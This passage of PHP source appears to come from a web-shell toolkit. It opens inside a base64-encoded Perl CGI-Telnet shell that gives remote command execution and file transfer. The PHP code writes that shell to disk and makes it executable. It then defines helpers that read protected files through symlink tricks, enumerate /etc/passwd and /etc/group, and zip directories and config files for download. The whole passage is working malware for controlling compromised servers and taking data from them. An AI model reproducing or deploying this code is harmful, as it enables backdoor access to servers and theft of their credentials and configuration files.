GV4aXN0cwoJewoJCSMgZW5jb2RlIHRoZSBmaWxlIGxpbmsgc28gd2UgY2FuIHNlbmQgaXQgdG8gdGhlIGJyb3dzZXIKCQkkRmlsZVVybCA9fiBzLyhbXmEtekEtWjAtOV0pLyclJy51bnBhY2soIkgqIiwkMSkvZWc7CgkJJERvd25sb2FkTGluayA9ICIkU2NyaXB0TG9jYXRpb24/YT1kb3dubG9hZCZmPSRGaWxlVXJsJm89Z28iOwoJCSRIdG1sTWV0YUhlYWRlciA9ICI8bWV0YSBIVFRQLUVRVUlWPVwiUmVmcmVzaFwiIENPTlRFTlQ9XCIxOyBVUkw9JERvd25sb2FkTGlua1wiPiI7CgkJJlByaW50UGFnZUhlYWRlcigiYyIpOwoJCXByaW50IDw8RU5EOwo8Y29kZT4KU2VuZGluZyBGaWxlICRUcmFuc2ZlckZpbGUuLi48YnI+CklmIHRoZSBkb3dubG9hZCBkb2VzIG5vdCBzdGFydCBhdXRvbWF0aWNhbGx5LAo8YSBocmVmPSIkRG93bmxvYWRMaW5rIj5DbGljayBIZXJlPC9hPi4KPC9jb2RlPgpFTkQKCQkmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsKCQkmUHJpbnRQYWdlRm9vdGVyOwoJfQoJZWxzZSAjIGZpbGUgZG9lc24ndCBleGlzdAoJewoJCSZQcmludFBhZ2VIZWFkZXIoImYiKTsKCQlwcmludCAiPGNvZGU+RmFpbGVkIHRvIGRvd25sb2FkICRGaWxlVXJsOiAkITwvY29kZT4iOwoJCSZQcmludEZpbGVEb3dubG9hZEZvcm07CgkJJlByaW50UGFnZUZvb3RlcjsKCX0KfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRoaXMgZnVuY3Rpb24gcmVhZHMgdGhlIHNwZWNpZmllZCBmaWxlIGZyb20gdGhlIGRpc2sgYW5kIHNlbmRzIGl0IHRvIHRoZQojIGJyb3dzZXIsIHNvIHRoYXQgaXQgY2FuIGJlIGRvd25sb2FkZWQgYnkgdGhlIHVzZXIuCiMgQXJndW1lbnQgMTogRnVsbHkgcXVhbGlmaWVkIHBhdGhuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIHNlbnQuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFNlbmRGaWxlVG9Ccm93c2VyCnsKCWxvY2FsKCRTZW5kRmlsZSkgPSBAXzsKCWlmKG9wZW4oU0VOREZJTEUsICRTZW5kRmlsZSkpICMgZmlsZSBvcGVuZWQgZm9yIHJlYWRpbmcKCXsKCQlpZigkV2luTlQpCgkJewoJCQliaW5tb2RlKFNFTkRGSUxFKTsKCQkJYmlubW9kZShTVERPVVQpOwoJCX0KCQkkRmlsZVNpemUgPSAoc3RhdCgkU2VuZEZpbGUpKVs3XTsKCQkoJEZpbGVuYW1lID0gJFNlbmRGaWxlKSA9fiAgbSEoW14vXlxcXSopJCE7CgkJcHJpbnQgIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC11bmtub3duXG4iOwoJCXByaW50ICJDb250ZW50LUxlbmd0aDogJEZpbGVTaXplXG4iOwoJCXByaW50ICJDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT0kMVxuXG4iOwoJCXByaW50IHdoaWxlKDxTRU5ERklMRT4pOwoJCWNsb3NlKFNFTkRGSUxFKTsKCX0KCWVsc2UgIyBmYWlsZWQgdG8gb3BlbiBmaWxlCgl7CgkJJlByaW50UGFnZUhlYWRlcigiZiIpOwoJCXByaW50ICI8Y29kZT5GYWlsZWQgdG8gZG93bmxvYWQgJFNlbmRGaWxlOiAkITwvY29kZT4iOwoJCSZQcmludEZpbGVEb3dubG9hZEZvcm07CgkJJlByaW50UGFnZUZvb3RlcjsKCX0KfQoKCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB1c2VyIGRvd25sb2FkcyBhIGZpbGUuIEl0IGRpc3BsYXlzIGEgbWVzc2FnZQojIHRvIHRoZSB1c2VyIGFuZCBwcm92aWRlcyBhIGxpbmsgdGhyb3VnaCB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4KIyBUaGlzIGZ1bmN0aW9uIGlzIGFsc28gY2FsbGVkIHdoZW4gdGhlIHVzZXIgY2xpY2tzIG9uIHRoYXQgbGluay4gSW4gdGhpcyBjYXNlLAojIHRoZSBmaWxlIGlzIHJlYWQgYW5kIHNlbnQgdG8gdGhlIGJyb3dzZXIuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIEJlZ2luRG93bmxvYWQKewoJIyBnZXQgZnVsbHkgcXVhbGlmaWVkIHBhdGggb2YgdGhlIGZpbGUgdG8gYmUgZG93bmxvYWRlZAoJaWYoKCRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlxcfF4uOi8pKSB8CgkJKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBwYXRoIGlzIGFic29sdXRlCgl7CgkJJFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOwoJfQoJZWxzZSAjIHBhdGggaXMgcmVsYXRpdmUKCXsKCQljaG9wKCRUYXJnZXRGaWxlKSBpZigkVGFyZ2V0RmlsZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOwoJCSRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7Cgl9CgoJaWYoJE9wdGlvbnMgZXEgImdvIikgIyB3ZSBoYXZlIHRvIHNlbmQgdGhlIGZpbGUKCXsKCQkmU2VuZEZpbGVUb0Jyb3dzZXIoJFRhcmdldEZpbGUpOwoJfQoJZWxzZSAjIHdlIGhhdmUgdG8gc2VuZCBvbmx5IHRoZSBsaW5rIHBhZ2UKCXsKCQkmUHJpbnREb3dubG9hZExpbmtQYWdlKCRUYXJnZXRGaWxlKTsKCX0KfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgd2FudHMgdG8gdXBsb2FkIGEgZmlsZS4gSWYgdGhlCiMgZmlsZSBpcyBub3Qgc3BlY2lmaWVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gYWxsb3dpbmcgdGhlIHVzZXIgdG8gc3BlY2lmeSBhCiMgZmlsZSwgb3RoZXJ3aXNlIGl0IHN0YXJ0cyB0aGUgdXBsb2FkIHByb2Nlc3MuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFVwbG9hZEZpbGUKewoJIyBpZiBubyBmaWxlIGlzIHNwZWNpZmllZCwgcHJpbnQgdGhlIHVwbG9hZCBmb3JtIGFnYWluCglpZigkVHJhbnNmZXJGaWxlIGVxICIiKQoJewoJCSZQcmludFBhZ2VIZWFkZXIoImYiKTsKCQkmUHJpbnRGaWxlVXBsb2FkRm9ybTsKCQkmUHJpbnRQYWdlRm9vdGVyOwoJCXJldHVybjsKCX0KCSZQcmludFBhZ2VIZWFkZXIoImMiKTsKCgkjIHN0YXJ0IHRoZSB1cGxvYWRpbmcgcHJvY2VzcwoJcHJpbnQgIjxjb2RlPlVwbG9hZGluZyAkVHJhbnNmZXJGaWxlIHRvICRDdXJyZW50RGlyLi4uPGJyPiI7CgoJIyBnZXQgdGhlIGZ1bGxseSBxdWFsaWZpZWQgcGF0aG5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgY3JlYXRlZAoJY2hvcCgkVGFyZ2V0TmFtZSkgaWYgKCRUYXJnZXROYW1lID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87CgkkVHJhbnNmZXJGaWxlID1+IG0hKFteL15cXF0qKSQhOwoJJFRhcmdldE5hbWUgLj0gJFBhdGhTZXAuJDE7CgoJJFRhcmdldEZpbGVTaXplID0gbGVuZ3RoKCRpbnsnZmlsZWRhdGEnfSk7CgkjIGlmIHRoZSBmaWxlIGV4aXN0cyBhbmQgd2UgYXJlIG5vdCBzdXBwb3NlZCB0byBvdmVyd3JpdGUgaXQKCWlmKC1lICRUYXJnZXROYW1lICYmICRPcHRpb25zIG5lICJvdmVyd3JpdGUiKQoJewoJCXByaW50ICJGYWlsZWQ6IERlc3RpbmF0aW9uIGZpbGUgYWxyZWFkeSBleGlzdHMuPGJyPiI7Cgl9CgllbHNlICMgZmlsZSBpcyBub3QgcHJlc2VudAoJewoJCWlmKG9wZW4oVVBMT0FERklMRSwgIj4kVGFyZ2V0TmFtZSIpKQoJCXsKCQkJYmlubW9kZShVUExPQURGSUxFKSBpZiAkV2luTlQ7CgkJCXByaW50IFVQTE9BREZJTEUgJGlueydmaWxlZGF0YSd9OwoJCQljbG9zZShVUExPQURGSUxFKTsKCQkJcHJpbnQgIlRyYW5zZmVyZWQgJFRhcmdldEZpbGVTaXplIEJ5dGVzLjxicj4iOwoJCQlwcmludCAiRmlsZSBQYXRoOiAkVGFyZ2V0TmFtZTxicj4iOwoJCX0KCQllbHNlCgkJewoJCQlwcmludCAiRmFpbGVkOiAkITxicj4iOwoJCX0KCX0KCXByaW50ICI8L2NvZGU+IjsKCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOwoJJlByaW50UGFnZUZvb3RlcjsKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgd2FudHMgdG8gZG93bmxvYWQgYSBmaWxlLiBJZiB0aGUKIyBmaWxlbmFtZSBpcyBub3Qgc3BlY2lmaWVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gYWxsb3dpbmcgdGhlIHVzZXIgdG8gc3BlY2lmeSBhCiMgZmlsZSwgb3RoZXJ3aXNlIGl0IGRpc3BsYXlzIGEgbWVzc2FnZSB0byB0aGUgdXNlciBhbmQgcHJvdmlkZXMgYSBsaW5rCiMgdGhyb3VnaCAgd2hpY2ggdGhlIGZpbGUgY2FuIGJlIGRvd25sb2FkZWQuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIERvd25sb2FkRmlsZQp7CgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgZG93bmxvYWQgZm9ybSBhZ2FpbgoJaWYoJFRyYW5zZmVyRmlsZSBlcSAiIikKCXsKCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7CgkJJlByaW50RmlsZURvd25sb2FkRm9ybTsKCQkmUHJpbnRQYWdlRm9vdGVyOwoJCXJldHVybjsKCX0KCQoJIyBnZXQgZnVsbHkgcXVhbGlmaWVkIHBhdGggb2YgdGhlIGZpbGUgdG8gYmUgZG93bmxvYWRlZAoJaWYoKCRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlxcfF4uOi8pKSB8CgkJKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBwYXRoIGlzIGFic29sdXRlCgl7CgkJJFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOwoJfQoJZWxzZSAjIHBhdGggaXMgcmVsYXRpdmUKCXsKCQljaG9wKCRUYXJnZXRGaWxlKSBpZigkVGFyZ2V0RmlsZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOwoJCSRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7Cgl9CgoJaWYoJE9wdGlvbnMgZXEgImdvIikgIyB3ZSBoYXZlIHRvIHNlbmQgdGhlIGZpbGUKCXsKCQkmU2VuZEZpbGVUb0Jyb3dzZXIoJFRhcmdldEZpbGUpOwoJfQoJZWxzZSAjIHdlIGhhdmUgdG8gc2VuZCBvbmx5IHRoZSBsaW5rIHBhZ2UKCXsKCQkmUHJpbnREb3dubG9hZExpbmtQYWdlKCRUYXJnZXRGaWxlKTsKCX0KfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIE1haW4gUHJvZ3JhbSAtIEV4ZWN1dGlvbiBTdGFydHMgSGVyZQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiZSZWFkUGFyc2U7CiZHZXRDb29raWVzOwoKJFNjcmlwdExvY2F0aW9uID0gJEVOVnsnU0NSSVBUX05BTUUnfTsKJFNlcnZlck5hbWUgPSAkRU5WeydTRVJWRVJfTkFNRSd9OwokTG9naW5QYXNzd29yZCA9ICRpbnsncCd9OwokUnVuQ29tbWFuZCA9ICRpbnsnYyd9OwokVHJhbnNmZXJGaWxlID0gJGlueydmJ307CiRPcHRpb25zID0gJGlueydvJ307CgokQWN0aW9uID0gJGlueydhJ307CiRBY3Rpb24gPSAibG9naW4iIGlmKCRBY3Rpb24gZXEgIiIpOyAjIG5vIGFjdGlvbiBzcGVjaWZpZWQsIHVzZSBkZWZhdWx0CgojIGdldCB0aGUgZGlyZWN0b3J5IGluIHdoaWNoIHRoZSBjb21tYW5kcyB3aWxsIGJlIGV4ZWN1dGVkCiRDdXJyZW50RGlyID0gJGlueydkJ307CmNob3AoJEN1cnJlbnREaXIgPSBgJENtZFB3ZGApIGlmKCRDdXJyZW50RGlyIGVxICIiKTsKCiRMb2dnZWRJbiA9ICRDb29raWVzeydTQVZFRFBXRCd9IGVxICRQYXNzd29yZDsKCmlmKCRBY3Rpb24gZXEgImxvZ2luIiB8fCAhJExvZ2dlZEluKSAjIHVzZXIgbmVlZHMvaGFzIHRvIGxvZ2luCnsKCSZQZXJmb3JtTG9naW47Cn0KZWxzaWYoJEFjdGlvbiBlcSAiY29tbWFuZCIpICMgdXNlciB3YW50cyB0byBydW4gYSBjb21tYW5kCnsKCSZFeGVjdXRlQ29tbWFuZDsKfQplbHNpZigkQWN0aW9uIGVxICJ1cGxvYWQiKSAjIHVzZXIgd2FudHMgdG8gdXBsb2FkIGEgZmlsZQp7CgkmVXBsb2FkRmlsZTsKfQplbHNpZigkQWN0aW9uIGVxICJkb3dubG9hZCIpICMgdXNlciB3YW50cyB0byBkb3dubG9hZCBhIGZpbGUKewoJJkRvd25sb2FkRmlsZTsKfQplbHNpZigkQWN0aW9uIGVxICJsb2dvdXQiKSAjIHVzZXIgd2FudHMgdG8gbG9nb3V0CnsKCSZQZXJmb3JtTG9nb3V0Owp9');
		
        if(file_exists($name)){
            return true;
        }else{

            if(@file_put_contents($name,$cgiTelnetCode)){
                @chmod($name,octdec("0755"));
                return true;
            }else{
                return false;
            }
        }
    }

    public function create_symlink($target){
        
        if(!file_exists($target)){
            return false;
        }else{
            $temp = sys_get_temp_dir().DIRECTORY_SEPARATOR.uniqid(rand(1,50)).".tmp";

            if(@symlink($target,$temp)){
                $content = @file_get_contents($temp);
                @unlink($temp);
                return $content;
            }else{
                if(@link($target,$temp)){
                    $content = @file_get_contents($temp);
                    @unlink($temp);
                    return $content;
                }else{
                    return false;
                }
            }
        }
        
    }
    public function prepare_search_cmd($location,$keyword,$type){

        if($type == 'all'){
            $cmd = 'find "'.$location.'" -iname "*'.$keyword.'*"';
        }elseif($type == 'files_only'){
            $cmd = 'find "'.$location.'" -type f -iname "*'.$keyword.'*"';
        }elseif($type == 'dirs_only'){
            $cmd = 'find "'.$location.'" -type d -iname "*'.$keyword.'*"';
        }
        return $cmd;
    }
    public function get_users_count(){
        if(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN'){
            return 'Windows not supported';
        }else{

            $read_as_arr = @array_map('trim',@file('/etc/passwd'));
            return count($read_as_arr);
        }
    }
    public function get_groups_count(){
        if(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN'){
            return 'Windows not supported';
        }else{
            $read_as_arr = @array_map('trim',@file('/etc/group'));
            return count($read_as_arr);
        }
    }
    public function download_as_zip($target){
        // https://stackoverflow.com/questions/55927020/how-to-zip-an-entire-folder-in-php-even-the-empty-ones
        if(!is_readable($target)) return false;
        $rootPath    = realpath($target);
        $zipFilename = $_SERVER['HTTP_HOST'].'-'.uniqid().'.zip';
        $zip = new ZipArchive();
        if($zip->open($zipFilename, ZipArchive::CREATE)){
            /** @var SplFileInfo[] $files */
            $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($rootPath), RecursiveIteratorIterator::LEAVES_ONLY);

            foreach ($files as $name => $file)
            {
                $filePath = $file->getRealPath();
                $relativePath = substr($filePath, strlen($rootPath) + 1);

                if (!$file->isDir())
                {
                    // Add current file to archive
                    $zip->addFile($filePath, $relativePath);
                }else {
                    if($relativePath !== false)
                        $zip->addEmptyDir($relativePath);
                }
            }
            if($zip->status == ZipArchive::ER_OK){
                $zip->close();
                return $zipFilename;
            }else{
                $zip->close();
                return false;
            }
        }else{
            return false;
        }

    }
    public function download_configs($configs){
        $configs = explode("\n",$configs);
        $configs = array_filter($configs);
        $configs = array_unique($configs);
        $configs = array_map('trim',$configs);
        $zipTemp = $_SERVER['HTTP_HOST'].'-configs.zip'; 
        $zip     = new ZipArchive();

        if($zip->open($zipTemp,ZipArchive::CREATE)){
                 
            foreach($configs as $config){
               $zip->addFile($config,basename($config));
            }
            if($zip->status == ZipArchive::ER_OK){
                $zip->close();
                return $zipTemp;
            }else{
                $zip->close();
                return false;
            }
        }else{
            return false;
        }    
    }
}


?>
